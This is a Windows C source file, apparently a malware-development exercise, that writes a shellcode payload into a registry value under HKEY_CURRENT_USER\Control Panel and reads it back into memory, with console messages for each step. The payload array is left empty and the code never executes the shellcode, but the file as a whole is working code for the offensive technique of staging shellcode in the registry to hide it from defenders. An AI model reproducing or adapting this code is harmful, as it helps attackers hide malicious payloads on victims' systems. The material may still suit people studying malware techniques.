#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "Advapi32.lib")

BOOL WriteToReg(IN PBYTE pPayload, IN DWORD dwPayloadSize) {
    HKEY hKey = NULL;
    BOOL bSuccess = false;
    printf("[*] Attempting to write data to the registry...\n");

    printf("[*] Opening registry key: HKEY_CURRENT_USER\\Control Panel... \n");
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        printf("[-] Failed To Open Registry\n");
        goto End;
    }
    printf("[+] Registry Key Opened Successfully.\n");

    printf("[*] Writing Data To The Registry Value 'NewReg'... \n");
    if (RegSetValueExA(hKey, "NewReg", 0, REG_BINARY, pPayload, dwPayloadSize) != ERROR_SUCCESS)
    {
        printf("[-] Failed To Write Data\n");
        goto End;
    }
    printf("[+] Data Successfully Written To The Registry.\n");

    bSuccess = true;

End:
    if (hKey) 
    {
        RegCloseKey(hKey);
        printf("[*] Registry Key Closed.\n");
    }
    return bSuccess;
}

BOOL ReadShellcodeFromRegistry(IN DWORD dwPayloadSize, OUT PBYTE* ppPayload) 
{
    DWORD dwBytesRead = dwPayloadSize;
    PVOID pBytes = NULL;

    printf("[*] Attempting to read shellcode from the registry...\n");

    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadSize);
    if (pBytes == NULL) {
        printf("[-] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    if (RegGetValueA(HKEY_CURRENT_USER, "Control Panel", "NewReg", RRF_RT_ANY, NULL, pBytes, &dwBytesRead) != ERROR_SUCCESS) {
        printf("[-] RegGetValueA Failed\n");
        HeapFree(GetProcessHeap(), 0, pBytes);
        return FALSE;
    }
    printf("[+] Shellcode successfully read from the registry.\n");

    *ppPayload = (PBYTE)pBytes;

    return TRUE;
}


int main() {
    unsigned char Payload[] = { "" };

    // Write payload to registry
    printf("[*] Press Enter to write the shellcode to the Windows registry...");
    getchar();
    printf("[*] Writing the payload to the Windows registry...\n");
    if (!WriteToReg(Payload, sizeof(Payload))) {
        printf("[-] Failed to write the payload to the registry.\n");
        return -1;
    }
    printf("[+] Payload successfully written to the registry.\n");

    // Read shellcode from registry
    PBYTE pShellcode = NULL;
    DWORD dwShellcodeSize = sizeof(Payload);
    printf("[*] Press Enter to read the shellcode from the Windows registry...");
    getchar();
    if (!ReadShellcodeFromRegistry(dwShellcodeSize, &pShellcode)) {
        printf("[-] Failed to read the shellcode from the registry.\n");
        return -1;
    }
    printf("[+] Shellcode successfully read from the registry: %s\n", pShellcode);

    // Clean up allocated memory
    if (pShellcode != NULL) {
        HeapFree(GetProcessHeap(), 0, pShellcode);
    }

    return 0;
}

